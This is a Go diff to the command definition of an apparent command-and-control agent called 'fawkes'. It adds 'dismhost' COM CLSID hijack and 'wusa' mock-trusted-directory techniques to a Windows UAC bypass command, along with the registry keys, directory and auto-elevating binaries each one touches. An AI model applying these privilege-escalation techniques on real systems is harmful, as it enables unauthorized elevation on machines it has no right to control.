@@ -11,7 +11,7 @@ func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "uac-bypass",
 		Description:         "Bypass User Account Control (UAC) to escalate from medium to high integrity. Registry-based hijack techniques that trigger auto-elevating Windows binaries.",
-		HelpString:          "uac-bypass [-technique fodhelper|computerdefaults|sdclt|eventvwr|silentcleanup|cmstp] [-command C:\\path\\to\\payload.exe]",
+		HelpString:          "uac-bypass [-technique fodhelper|computerdefaults|sdclt|eventvwr|silentcleanup|cmstp|dismhost|wusa] [-command C:\\path\\to\\payload.exe]",
 		Version:             1,
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
@@ -26,8 +26,8 @@ func init() {
 				ModalDisplayName: "Bypass Technique",
 				CLIName:          "technique",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"fodhelper", "computerdefaults", "sdclt", "eventvwr", "silentcleanup", "cmstp"},
-				Description:      "UAC bypass technique: fodhelper (Win10+, ms-settings hijack), computerdefaults (Win10+, ms-settings hijack), sdclt (Win10, Folder handler hijack), eventvwr (Win10+, mscfile hijack), silentcleanup (Win10+, env var hijack), cmstp (Win10+, INF file abuse)",
+				Choices:          []string{"fodhelper", "computerdefaults", "sdclt", "eventvwr", "silentcleanup", "cmstp", "dismhost", "wusa"},
+				Description:      "UAC bypass technique: fodhelper (Win10+, ms-settings hijack), computerdefaults (Win10+, ms-settings hijack), sdclt (Win10, Folder handler hijack), eventvwr (Win10+, mscfile hijack), silentcleanup (Win10+, env var hijack), cmstp (Win10+, INF file abuse), dismhost (Win10+, COM CLSID hijack), wusa (Win10+, mock trusted directory)",
 				DefaultValue:     "fodhelper",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
@@ -110,6 +110,14 @@ func init() {
 			case "cmstp":
 				createArtifact(taskData.Task.ID, "File Write", "%TEMP%\\CMSTP_*.inf (UAC bypass via cmstp)")
 				createArtifact(taskData.Task.ID, "Process Create", "Auto-elevation trigger: cmstp.exe /au")
+			case "dismhost":
+				createArtifact(taskData.Task.ID, "Registry Write", "HKCU\\Software\\Classes\\CLSID\\{3ad05575-8857-4850-9277-11b85bdb8e09}\\LocalServer32 (UAC bypass via dismhost COM hijack)")
+				createArtifact(taskData.Task.ID, "Process Create", "Auto-elevation trigger: pkgmgr.exe (DISM COM activation)")
+			case "wusa":
+				createArtifact(taskData.Task.ID, "Directory Create", "C:\\Windows \\System32\\ (mock trusted directory with trailing space)")
+				createArtifact(taskData.Task.ID, "File Write", "C:\\Windows \\System32\\computerdefaults.exe (copied auto-elevating binary)")
+				createArtifact(taskData.Task.ID, "Registry Write", "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command (UAC bypass via wusa mock directory)")
+				createArtifact(taskData.Task.ID, "Process Create", "Auto-elevation trigger: computerdefaults.exe from mock trusted directory")
 			default:
 				createArtifact(taskData.Task.ID, "Registry Write", "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command (UAC bypass via "+technique+")")
 				createArtifact(taskData.Task.ID, "Process Create", "Auto-elevation trigger: "+technique+".exe")
